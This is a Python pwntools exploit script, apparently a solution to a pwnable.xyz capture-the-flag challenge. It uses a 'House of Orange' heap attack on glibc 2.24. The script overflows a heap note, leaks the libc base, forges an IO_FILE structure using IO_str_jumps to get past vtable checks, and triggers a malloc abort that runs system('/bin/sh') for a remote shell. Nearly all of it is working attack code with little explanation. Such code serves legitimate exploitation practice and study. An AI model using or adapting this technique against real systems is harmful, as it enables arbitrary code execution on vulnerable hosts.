###House of orange in libc2.24
###Utilize IO_str_jumps to bypass vtable checks

from pwn import *
from IO_FILE import *

###Structure
'''
    |   8   |   8   |
0x00|siz|   | title |
0x10|      note     |
           ...
0xn0|      note     |
'''

###Utils
def create(size,title,data,mode='normal'):
    r.sendlineafter('> ','1')
    r.sendlineafter('Size: ',str(size))
    r.sendafter('Title',title)
    if mode=='normal':
        r.sendafter('Note: ',data)

def edit(idx,data):
    r.sendlineafter('> ','2')
    r.sendlineafter('Note: ',str(idx))
    r.sendafter('Data: ',data)

def show():
    r.sendlineafter('> ','3')
    return r.recvuntil('\nMenu',drop=True)

###Addr
#  libc2.24
main_arena_offset = 0x393640
IO_list_all_offset = 0x394060
IO_str_jumps_offset = 0x390500	###added script in IO_FILE to find IO_str_jumps_offset
system_offset = 0x404f0
bin_sh_offset = 0x15c88a

###Exploit
r = remote('svc.pwnable.xyz',30041)

###Since note of size+16 will be malloced, setting size to -1 will result in small chunk, but allow edit to overflow buf
###Hijack top chunk to get libc
create(0xffffffffffffffff,'M30W','M30W',mode='overflow')
edit(0,b'a'*0x38+p64(0xfb1)+b'a'*0x200)
create(0xff8,'\x01','M30W',mode='normal')
libc_base = (u64(show().split(b'\n')[1].split(b': ')[0]+b'\x00\x00')&0xfffffffffffff000)-(main_arena_offset&0xfffffffffffff000)
print(hex(libc_base))

###Utilize IO_str_jumps to perform house of orange under vtable checks in libc2.24
padding = b'\x00'*0x60
IO_FILE = IO_FILE_plus(arch=64)
stream = IO_FILE.construct(flags=0,
                           write_base=0,write_ptr=(libc_base+bin_sh_offset-100)//2+1,
                           buf_base=0,buf_end=(libc_base+bin_sh_offset-100)//2,
                           mode=0,
                           vtable=libc_base+IO_str_jumps_offset)
stream = p64(0)+p64(0x61)+p64(0)+p64(libc_base+IO_list_all_offset-0x10)+stream[0x20:]
payload = padding+stream.ljust(0xe0,b'\x00')+p64(libc_base+system_offset)
edit(0,payload)

###Trigger malloc error to force IO_flush_lockp and get shell
r.sendlineafter('> ','1')
r.sendlineafter('Size: ','1')

r.interactive()


###Reference
#  https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24/
